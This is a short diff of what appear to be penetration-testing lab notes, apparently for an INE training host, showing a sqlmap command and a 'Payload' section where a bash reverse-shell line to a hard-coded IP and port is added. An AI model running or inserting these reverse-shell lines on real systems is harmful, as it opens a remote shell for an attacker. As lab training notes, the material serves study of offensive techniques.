@@ -271,7 +271,8 @@ sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&p
 ## Payload
 ```
 #!/bin/bash
-bash -c "bash -i >& /dev/tcp/$IP/$PORT 0>&1" 
+bash -c "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
+bash -c \'bash -i >& /dev/tcp/192.132.186.2/4242 0>&1\'
 ```
 ## Listener
 ```bash
